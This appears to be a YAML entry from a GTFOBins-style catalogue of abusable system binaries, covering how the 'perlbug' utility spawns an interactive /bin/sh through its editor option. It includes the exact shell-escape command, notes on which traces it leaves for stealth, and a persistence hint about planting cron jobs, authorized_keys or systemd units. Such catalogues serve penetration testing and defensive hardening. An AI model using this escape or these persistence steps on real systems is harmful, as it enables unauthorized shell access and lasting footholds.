---
name: perlbug
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'perlbug -s ''x x x'' -r x -c x -e ''exec /bin/sh #'''
  notes: This requires to press `Enter` serveral times before the shell is spawn.
references:
- https://gtfobins.github.io/gtfobins/perlbug/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
